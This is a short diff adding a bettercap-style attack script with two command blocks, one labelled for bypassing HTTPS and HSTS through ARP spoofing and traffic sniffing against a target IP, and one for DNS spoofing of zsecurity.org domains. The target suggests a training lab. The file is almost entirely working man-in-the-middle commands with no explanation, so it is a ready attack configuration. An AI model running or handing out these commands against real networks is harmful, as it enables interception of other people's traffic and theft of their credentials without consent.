@@ -1,0 +1,18 @@
+# Script for bypassing HTTPS & HSTS
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets *ip_address (ex: 192.168.43.142)
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+
+#Script for DNS Spoofing
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets *ip_address (ex: 192.168.43.142)
+set net.sniff.local true
+set dns.spoof.all true
+set dns.spoof.domains zsecurity.org,*.zsecurity.org
+dns.spoof on
+arp.spoof on
+net.sniff on
